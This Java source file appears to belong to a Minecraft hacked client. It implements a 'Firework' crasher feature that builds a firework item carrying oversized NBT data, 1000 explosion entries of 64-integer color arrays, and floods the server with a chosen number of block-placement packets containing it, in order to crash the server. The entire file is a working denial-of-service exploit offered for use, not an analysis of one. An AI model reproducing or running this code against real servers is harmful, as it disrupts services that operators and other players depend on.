package com.skidding.atlas.primitive.impl.exploit;

import com.skidding.atlas.module.ModuleCategory;
import com.skidding.atlas.primitive.PrimitiveFeature;
import com.skidding.atlas.primitive.argument.Argument;
import com.skidding.atlas.util.minecraft.chat.ChatUtil;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;

import java.util.Arrays;

public class FireworkPrimitive extends PrimitiveFeature {

    public FireworkPrimitive() {
        super("Firework", "Attempts to crash the server using fireworks' NBT", ModuleCategory.CRASHER, new Argument("Packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) {
        long start = System.currentTimeMillis();
        int packets = (int) args[0];

        for (int i = 0; i < packets; i++) {
            getPlayer().sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(getFireworks()));
        }

        ChatUtil.print(STR."Sent \{packets} packets in \{System.currentTimeMillis() - start}ms");
    }

    private ItemStack getFireworks() {
        ItemStack itemStack = new ItemStack(Items.fireworks);

        NBTTagCompound compound = new NBTTagCompound();
        NBTTagCompound fireworks = new NBTTagCompound();
        NBTTagList explosions = new NBTTagList();

        int[] colors = new int[64];
        for (int i = 0; i < 1000; ++i) {
            Arrays.fill(colors, i + 1);

            NBTTagCompound explosion = new NBTTagCompound();
            explosion.setIntArray("Colors", colors);
            explosions.appendTag(explosion);
        }

        fireworks.setTag("Explosions", explosions);
        fireworks.setByte("Flight", (byte) 2);
        compound.setTag("Fireworks", fireworks);
        itemStack.setTagCompound(compound);
        return itemStack;
    }

}
